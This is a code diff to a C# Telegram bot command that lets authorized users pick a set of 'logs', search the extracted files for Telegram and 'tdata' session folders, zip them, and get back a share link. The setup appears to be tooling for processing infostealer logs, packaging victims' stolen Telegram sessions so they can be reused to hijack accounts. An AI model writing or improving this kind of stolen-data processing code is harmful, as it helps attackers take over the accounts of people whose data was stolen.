@@ -1,5 +1,3 @@
-using Aspose.Zip.SevenZip;
-using Core.Models.Extensions;
 using TelegramBot.Extensions;
 using TelegramBot.Models;
 using TelegramBot.Services;
@@ -10,35 +8,36 @@ namespace TelegramBot.Commands.Services;
 
 public class TelegramServiceCommand(Client client, DataService data) : ICommand, ICallbackCommand
 {
-    public async Task Invoke(UpdateBotCallbackQuery update, User user)
+    public bool AuthorizedOnly { get; } = true;
+
+    Task ICommand.Invoke(UpdateNewMessage update, User user) =>
+        client.SendMessageAvailableLogs(user, "Telegram", data);
+    
+    async Task ICallbackCommand.Invoke(UpdateBotCallbackQuery update, User user)
     {
         if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
             { } logsname) return;
 
-        string archive = data.CreateZipPath(logsname, "Telegram");
-
         await client.EditMessage(user, update.msg_id, $"Telegram\nParsing from {logsname}");
 
-        var zip = new SevenZipArchive();
+        var directories = Directory.GetDirectories(data.GetExtractedPath(logsname))
+                                        .SelectMany(x => Directory.GetDirectories(x, "*", SearchOption.AllDirectories))
+                                        .Select(x => new DirectoryInfo(x))
+                                        .Where(x => x.Name.StartsWith("Telegram") || x.Name.StartsWith("tdata"))
+                                        .SelectMany(x => x.Name.StartsWith("Telegram") ? x.GetDirectories() : [x])
+                                        .Select(x => x.FullName)
+                                        .ToArray();
 
-        Directory.GetDirectories(data.GetExtractedPath(logsname))
-                 .Select(x => Directory.GetDirectories(x, "Telegram", SearchOption.AllDirectories).FirstOrDefault())
-                 .Where(x => x is { })
-                 .Where(x =>
-                 {
-                     string name = new DirectoryInfo(x).Name;
-                     return name.StartsWith("Profile") || name.StartsWith("tdata");
-                 })
-                 .SelectPerTask(x => zip.CreateEntries(x));
-        
-        zip.Save(archive);
+        var archive = Path.Combine(data.BaseFolder, "Telegram", $"{logsname}.zip");
+        using var zip = new Ionic.Zip.ZipFile(archive);
 
-        await client.Messages_SendMessage(user, $"{logsname}\n{await data.GetShareLinkAsync(archive)}",
-            Random.Shared.NextInt64(), clear_draft: true);
+        for (int i = 0; i < directories.Length; i++)
+        {
+            zip.AddDirectory(directories[i], $"{i}");
+        }
+
+        zip.Save();
+
+        await client.EditMessage(user, update.msg_id, $"{logsname}\n{await data.GetShareLinkAsync(archive)}");
     }
-
-    public bool AuthorizedOnly { get; } = true;
-
-    public Task Invoke(UpdateNewMessage update, User user) =>
-        client.SendMessageAvailableLogs(user, data, "Telegram");
 }
